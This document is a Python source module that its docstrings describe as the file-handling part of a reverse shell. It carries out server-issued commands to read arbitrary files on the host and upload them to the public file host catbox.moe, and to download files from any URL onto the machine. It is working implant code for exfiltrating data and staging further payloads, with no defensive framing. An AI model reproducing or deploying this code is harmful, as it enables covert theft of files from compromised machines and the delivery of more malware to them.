"""
This module handles all the file related task for the reverse shell
"""

# 1st party imports
import os
from pathlib import Path
from typing import List, Optional

# 3rd party imports
import requests

# local imports
from commands import ShellCommands


class FileManager:
    """
    This class handles all the file related task for the reverse shell
    """

    def handle_command(self, command: List[str]) -> str:
        """
        Handle the command received from the server.

        Args:
            command (List[str]): The command to handle.

        Returns:
            str: The output of the command.
        """

        if command[0] == ShellCommands.UPLOAD_FILE.value:
            return self.upload_file(command[1])

        elif command[0] == ShellCommands.DOWNLOAD_FILE.value:
            return self.download_file(command[1])

        else:
            return "Invalid command for file manager. Provided command: '{}'".format(" ".join(command))

    def _upload_bytes(self, file_bytes: bytes) -> str:
        """
        Upload the file to the server.

        Args:
            file_bytes (bytes): The bytes of the file to upload.

        Returns:
            str: The output of the command.
        """

        # create the url and data
        url = "https://catbox.moe/user/api.php"
        data = {"reqtype": "fileupload"}

        # create the file payload
        file = {"fileToUpload": file_bytes}

        try:

            # upload the file
            response = requests.post(url, files=file, data=data)

            # check the status
            response.raise_for_status()

            # return the response
            return response.text
        except Exception as e:
            return "Failed to send file. Error: {}".format(str(e))

    def upload_file(self, file_path: str) -> str:
        """
        Upload the file to the server.

        Args:
            file_path (str): The path of the file to upload.

        Returns:
            str: The output of the command.
        """

        # check if the file exists
        if not os.path.exists(file_path):
            return "File does not exist. File path: `{}`".format(file_path)

        # read the file
        with open(file_path, "rb") as file:
            file_bytes = file.read()

        try:

            # upload the file
            response = self._upload_bytes(file_bytes)

            # return the response
            return response
        except Exception as e:
            return "Failed to send file. File path: `{}`. Error: {}".format(file_path, str(e))

    def download_file(self, file_url: str, file_path: Optional[str] = None) -> str:
        """
        Download the file from the server.

        Args:
            file_url (str): The URL of the file to download.
            file_path (Optional[str]): The path to save the file. If None, the file will be saved in the current directory.

        Returns:
            str: The output of the command.
        """

        # check if the path exists and create it if it doesn't
        if file_path is not None:
            Path(file_path).parent.mkdir(parents=True, exist_ok=True)

        # if no path is provided save in the current directory
        else:
            name = file_url.split("/")[-1]
            file_path = Path(__file__).parent / name

        try:

            # download the file
            response = requests.get(file_url)

            # check the status
            response.raise_for_status()

            # save the file
            with open(file_path, "wb") as file:
                file.write(response.content)

            # return the response
            return "File saved successfully at: `{}`".format(file_path)
        except Exception as e:
            return "Failed to download file. URL: `{}`. Error: {}".format(file_url, str(e))
